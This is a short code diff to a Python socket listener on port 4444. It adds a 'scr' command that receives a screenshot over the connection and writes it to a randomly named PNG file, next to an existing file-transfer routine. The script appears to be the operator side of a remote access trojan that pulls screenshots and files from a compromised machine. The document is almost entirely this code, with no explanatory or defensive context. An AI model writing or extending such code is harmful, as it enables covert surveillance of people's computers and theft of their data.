@@ -1,6 +1,7 @@
 import socket
 import os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+import random
 h=""
 p=4444
 e="utf-8"
@@ -72,6 +73,18 @@ while True:
                 data=file.read()
                 conn.sendall(data)
                 c+=len(data)
+    if com == b"scr":
+        t=random.randint(1111,9999)
+        t=str(t)
+        with open("{}.png".format(t),"wb") as file:
+            c=0
+            size= int(conn.recv(1024).decode(e))
+            while c < size:
+                data = conn.recv(1024)
+                file.write(data)
+                c+=(len(data))
+                    
+
 
 s.close()
 conn.close()
